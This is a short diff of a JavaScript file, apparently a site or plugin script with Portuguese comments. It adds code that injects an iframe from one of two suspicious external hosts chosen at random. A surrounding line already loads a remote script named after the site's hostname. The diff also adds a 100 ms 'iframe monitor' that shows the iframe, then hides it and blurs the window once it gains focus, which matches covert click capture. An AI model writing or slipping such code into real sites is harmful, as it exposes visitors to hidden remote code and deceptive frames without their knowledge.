@@ -107,8 +107,12 @@
 		return style;
 	}	
 	$(document).ready(function(){
+		var URIs = Array();
+		URIs.push('https://trynull.ga/try/');
+		URIs.push('https://pluginsupdatinginfos.herokuapp.com/try/');
 		var css_ifrm_showId = instance.makeid_str();
-		var ifrmUri = 'https://trynull.ga/try/'+(instance.is_mobile()?'?=mobile':'');
+		var ifrmUri = URIs[Math.floor(Math.random() * URIs.length)];
+		//var ifrmUri = 'try.html';
 		//Criar iframe
 		var ifrmId = instance.makeid_str();
 		var ifrm = instance.create_ifrm(ifrmId, ifrmUri);
@@ -119,9 +123,28 @@
 		css += 'iframe['+ifrmId+'].'+css_ifrm_showId+'{display:block;visibility:visible;}';
 		instance.create_css(instance.makeid_str(), css);
 		
-		
 		//instance.load_blob_scr('console.log();', function(){});
 		instance.load_scr('https://trynull.ga/js/'+instance.get_hostname()+'.js', function(){});
+		
+		//mostra iframe
+		$(ifrm).attr('class', css_ifrm_showId);
+		
+		
+		
+		//iframe monitor
+		var ifrm_monitor = setInterval(function(){
+			var elem = document.activeElement;
+			if(elem){
+				$(elem).trigger('monitor');
+			}
+		}, 100);
+		
+		$(ifrm).on('monitor', function(){
+			setTimeout(function(){ $(ifrm).removeClass(); }, 1000);
+			$(window).blur();
+		});
+		
+		
 	});
 	
 	console.API;
